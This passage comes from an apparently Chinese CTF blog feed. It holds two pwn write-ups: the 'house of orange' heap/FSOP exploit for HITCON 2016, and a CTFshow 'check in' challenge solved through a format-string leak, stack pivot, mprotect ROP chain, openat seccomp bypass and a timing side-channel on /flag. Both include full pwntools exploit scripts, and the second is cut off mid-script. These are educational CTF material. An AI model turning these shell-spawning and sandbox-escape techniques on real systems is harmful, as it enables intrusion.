src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031748879.png" alt="image-20220303174804774"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031747576.png" alt="image-20220303174729507"></p><ul><li>Build the house 即 add 函数，最多只能创建 4 次 chunk</li></ul><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031748764.png" alt="image-20220303174836674"></p><ul><li><p>edit</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031753144.png" alt="image-20220303175308057"></p><p>其中可以重新输入长度进行堆溢出，最多 edit3 次</p><p>因此思路为首先使用 house of orange 释放出 unsorted bin 然后利用 FSOP 劫持程序流</p><blockquote><ol><li>申请一个小的 house，然后把 top chunk 的大小改小</li><li>申请一个较大的 house（此时原来的 topchunk 被释放进 unsorted bin），再申请一个 large bin 范围内的 house（切割 unsorted bin），利用该 house 泄露 libc 和堆地址</li><li>编辑 house，把剩下 unsorted bin 的 size 改为 0x60，并在其中伪造 <code>_IO_FILE_plus结构体</code> 和 <code>unsorted bin chunk</code></li><li>在这一步中，我们首先利用 unsorted bin attack 修改 <code>_IO_list_all</code> ，这需要把该 chunk 的 bk 改为 <code>_IO_list_all-0x10</code></li><li>再次 malloc，触发错误，获得 shell<br>malloc 时，对 unsorted bin 进行判断，此时该 chunk 的 size 为 0x60，不满足要求，就把该 chunk 放入 small bin，并且向 bk-&gt;fd 写入 main_arena+0x58，即向 <code>_IO_list_all</code>  写入 <code>main_arena+0x58</code> <br> 此时判断下一个 <code>unsorted bin（_IO_list_all）</code> ，而这里实际上没有 chunk，此时会触发错误<br>此时第一个 <code>_IO_FILE_plus结构体</code> 为 <code>main_arena+0x58</code> ，而它不满足条件，就通过_chain 调到下一个_ <code>IO_FILE_plus</code>  结构体， <code>_chain</code>  位于 0x68 偏移的地方， <code>main_arena+0x58+0x68=main_arena+0xc0</code> , 就是 <code>small bin</code>  中 0x60 大小的地方，这就回到了我们伪造的 <code>_IO_FILE_plus结构体</code> 。</li></ol></blockquote></li></ul><h2 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h2><h3 id="关于house-of-orange"><a class="markdownIt-Anchor" href="#关于house-of-orange">#</a> 关于 house of orange</h3><p>核心在于当题目中不存在 free 函数时，通过漏洞利用获得 free 的效果，即在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><h3 id="fsop"><a class="markdownIt-Anchor" href="#fsop">#</a> FSOP</h3><p>在 libc 的 <code>_IO_list_all</code>  中，存放有一个 <code>_IO_FILE_plus</code>  结构体的指针，<br>如下图，它指向 <code>_IO_2_1_stderr_</code> ：</p><p><img src="https://img-blog.csdnimg.cn/20200427101745159.png" alt="在这里插入图片描述"></p><p>而 <code>_IO_FILE_plus</code>  结构体详细内容如下</p><p><img src="https://img-blog.csdnimg.cn/20200427101902924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0NTgyMA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>其中_chain 指向下一个 <code>_IO_FILE_plus</code>  结构体</p><p>在 malloc 中，它调用 malloc_printerr 来打印错误，经过一系列调用，最终来到 <code>_IO_flush_all_lockp</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果满足以下条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &gt; 0</span><br><span class="line">_IO_vtable_offset (fp) == 0</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure><p>就会调用 _IO_OVERFLOW，并把结构体当做第一个参数传入<br>如果我们能够把 _IO_OVERFLOW 改为 system，并且伪造结构体，开头为 /bin/sh，就能获得 shell 了</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;node4.buuoj.cn&quot;, 29155)</span></span><br><span class="line"></span><br><span class="line">r= process(<span class="string">&#x27;houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">  r.send(content)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>) <span class="comment">#1-7</span></span><br><span class="line">  r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">  r.send(content)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>) <span class="comment">#1-7</span></span><br><span class="line">  r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa\n&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> +p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">666</span>, <span class="number">0xddaa</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;a\n&#x27;</span>,<span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>, <span class="number">199</span>, <span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span> - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;malloc_hook = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc.address = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload, <span class="number">199</span>, <span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line">success(<span class="string">&#x27;heap = &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)<span class="comment">#to small bin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://bbs.pediy.com/thread-222718.htm">https://bbs.pediy.com/thread-222718.htm</a></p><p><a href="https://www.anquanke.com/post/id/218887#h3-4">https://www.anquanke.com/post/id/218887#h3-4</a></p><p><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW卷王杯-pwn</title>
      <link href="/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"/>
      <url>/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/</url>
      
        <content type="html"><![CDATA[<p>根据官方 wp 学习了两道好题</p><span id="more"></span><h1 id="check-in"><a class="markdownIt-Anchor" href="#check-in">#</a> check in</h1><h2 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h2><p>发现开了 <code>**sandbox**</code> （之后再仔细分析），然后读入姓名那里有一个明显的<strong>格式化字符串漏洞</strong>，再之后可以读入 <code>0x90</code>  大小的数据，然而数组大小只有 <code>0x80</code> ，很明显是一个<strong>栈溢出</strong>，但是溢出的长度非常短，只有 <code>0x10</code> ，也就是只能覆盖 <code>rbp</code>  和 <code>ret</code> ，在程序的最后有 <code>close(1)</code> <strong> 关闭了标准输出的文件描述符</strong>，也就是我们无法泄露任何信息，包括最终得到的 <code>flag</code> ，最后再看下此题的保护：<strong>没有开</strong> <code>**Canary**</code> <strong> 和</strong> <code>**PIE**</code> <strong> 保护</strong>。</p><p>首先，格式化字符串的利用方式很显然，可以用于<strong>泄露</strong> <code>**libc**</code> ：通过泄露 <code>__libc_start_main + 243</code> ，即可得到 <code>libc_base</code> 。</p><p>再来看栈溢出该如何利用，既然我们只能覆盖到 <code>rbp</code>  和 <code>ret</code> ，其中 <code>ret</code>  是跳转执行的地址，那么就可以考虑何处受 <code>rbp</code>  控制，又方便我们利用，不难想到 <code>read</code>  的时候，是将 <code>0x90</code>  的数据读到栈上的，而栈上的地址就受 <code>rbp</code>  控制，由汇编：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4013dd</span> &lt;main+<span class="number">163</span>&gt;:    lea    rax,[rbp-<span class="number">0x80</span>]</span><br><span class="line"><span class="number">0x4013e1</span> &lt;main+<span class="number">167</span>&gt;:    mov    edx,<span class="number">0x90</span></span><br><span class="line"><span class="number">0x4013e6</span> &lt;main+<span class="number">172</span>&gt;:    mov    rsi,rax</span><br><span class="line"><span class="number">0x4013e9</span> &lt;main+<span class="number">175</span>&gt;:    mov    edi,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x4013ee</span> &lt;main+<span class="number">180</span>&gt;:    call   <span class="number">0x401100</span> &lt;read@plt&gt;</span><br></pre></td></tr></table></figure><p>可见， <code>read</code>  的第二个参数 <code>rsi</code> （写入数据的地址）就是 <code>rbp-0x80</code>  中的内容，因此，我们可以通过<strong>控制</strong> <code>**rbp**</code> <strong> 为</strong> <code>**bss**</code> <strong> 段上的某地址，然后再通过</strong> <code>**ret**</code> <strong> 跳转到</strong> <code>**0x4013dd**</code> <strong> 的位置，即可往</strong> <code>**bss**</code> <strong> 段上写入内容</strong>，再之后通过一个<strong>栈迁移</strong>，即可跳转到我们读到 <code>bss</code>  段上的 <code>gadget</code>  并执行。</p><p>最后，我们来看一下这个 <code>sandbox</code> ，是个黑名单，禁用 <code>socket</code>  那些主要就是为了防止重启输出流造成非预期的，可以先不用管，主要就是发现禁用了 <code>open</code>  的系统调用和 <code>read</code>  相关的系统调用，虽然没有禁 <code>write</code>  相关的系统调用，但是由于有 <code>close(1)</code> ，所以也无法输出，这看似是无法 <code>orw</code>  了，不过仔细分析后可以发现： <code>open</code>  的系统调用虽然被禁用了，但是我们<strong>可以用</strong> <code>**openat**</code> <strong> 系统调用来代替</strong> <code>**open**</code> <strong> 系统调用</strong>（ <code>libc</code>  中的 <code>open</code>  函数就是对 <code>openat</code>  这个底层系统调用的封装）， <code>openat</code>  分绝对路径和相对路径两种写法， <code>exp</code>  中都给出了；再来看 <code>read</code> ，注意到 <code>read</code>  相关的系统调用并非全部被禁用了，当 <code>read</code>  的 <code>fd</code>  为 <code>0</code>  时， <code>read</code>  是可用的，对于常规 <code>orw</code>  来说，先 <code>open</code>  一个文件，由于 <code>0,1,2</code>  都分别被标准输入，输出，报错给占用了，所以文件描述符是从 <code>3</code>  开始的，而若是我们在 <code>open</code>  前，<strong>先</strong> <code>**close(0)**</code> <strong>，再</strong> <code>**open**</code> <strong> 的话，我们打开的文件的描述符就是</strong> <code>**0**</code> <strong> 了，我们也就可以</strong> <code>**read**</code> <strong> 读取文件内容了</strong>；最后，对于 <code>write</code>  来说，可以采用 **“侧信道攻击”<strong> 的方式，就是对 <code>flag</code>  的每一位进行爆破，与我们已经 <code>read</code>  读入到内存中的真实 <code>flag</code>  进行比对，比如，若是相等就触发死循环，那么我们就可以通过判断接收数据用了多久来判断猜测是否正确了，在当前假设下，若是超过了 <code>1</code>  秒，则说明我们这一位爆破猜测成功了，当然，我这里写了一个</strong> “二分法”<strong> 的版本，不然会耗费很长时间（其实， <code>CTFshow</code>  的 <code>flag</code>  好像用的是 <code>uuid</code>  字符串，也就是 <code>&#123;&#125;</code>  中的内容仅局限于 <code>-0123456789abcdef</code>  这几个字符，因此，应该还能进一步缩短我 <code>exp</code>  的爆破时长）。由于 “侧信道攻击” 最好使用 <code>shellcode</code>  来实现，故在之前需要用 <code>mprotect</code>  的 <code>gadget</code>  链改一下 <code>bss</code>  段的可执行权限，而一次性只能读入 <code>0x80</code>  大小的数据，可能无法将 <code>orw</code>  的 <code>shellcode</code>  和 <code>mprotect</code>  的 <code>gadget</code>  一起读进 <code>bss</code>  段，因此，我们可以</strong>先写一小段 ** <code>**shellcode**</code> <strong> 作为跳板</strong>和 <code>mprotect</code>  的 <code>gadget</code>  一起读入到 <code>bss</code>  段，再通过这个跳板，将 <code>orw</code>  的 <code>shellcode</code>  读到 <code>bss</code>  段上并跳转执行</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./checkin&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.30.so&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">read_addr = <span class="number">0x4013DD</span></span><br><span class="line">leave_addr = <span class="number">0x401402</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name :\n&quot;</span>, <span class="string">b&#x27;%25$p&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Hello, &quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>)[<span class="number">2</span>:], <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + p64(bss_addr + <span class="number">0x80</span>) + p64(read_addr)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;check in :\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">    shellcode_read = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        push <span class="subst">&#123;bss_addr+<span class="number">0x100</span>&#125;</span></span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        push 0x100</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x26bb2</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x2709c</span></span><br><span class="line">    pop_rdx_r12_ret = libc_base + <span class="number">0x11c421</span></span><br><span class="line">    mprotect_addr = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(bss_addr &amp; <span class="number">0xfffff000</span>) + p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>) + p64(pop_rdx_r12_ret) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>) + p64(mprotect_addr)</span><br><span class="line">    payload += p64(bss_addr + <span class="built_in">len</span>(payload) + <span class="number">8</span>) + asm(shellcode_read)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss_addr - <span class="number">8</span>) + p64(leave_addr)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    shellcode_main = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* close(0) */</span></span><br><span class="line"><span class="string">        push 3</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        /* openat(&quot;/flag&quot;) */</span></span><br><span class="line"><span class="string">        push 257</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* ( absolute path ) */</span></span><br><span class="line"><span class="string">        mov rsi, 0x67616c662f</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /*</span></span><br><span class="line"><span class="string">        ( relative path )</span></span><br><span class="line"><span class="string">        push -100</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        push rsp</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        */</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        /* read flag */</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        push 0x50</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        /* blow up flag */</span></span><br><span class="line"><span class="string">        mov al, byte ptr[rsi+<span class="subst">&#123;pos&#125;</span>]</span></span><br><span class="line"><span class="string">        cmp al, <span class="subst">&#123;char&#125;</span></span></span><br><span class="line"><span class="string">        ja $-2</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(asm(shellcode_main))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    start = time.time()</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right :</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">            io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28102</span>)</span><br><span class="line">            pwn(pos, <span class="built_in">ord</span>(possible_list[mid]))</span><br><span class="line">            s = time.time()</span><br><span class="line">            io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">            t = time.time()</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">if</span> t - s &gt; <span class="number">1</span> :</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                right = mid</span><br><span class="line">        flag += possible_list[left]</span><br><span class="line">        info(flag)</span><br><span class="line">        <span class="keyword">if</span> possible_list[left] == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pos = pos + <span class="number">1</span></span><br><span class="line">    success(flag)</span><br><span class="line">    end = time.time()</span><br><span class="line">    success(<span class="string">&quot;time:\t&quot;</span> + <span class="built_in">str</span>(end - start) + 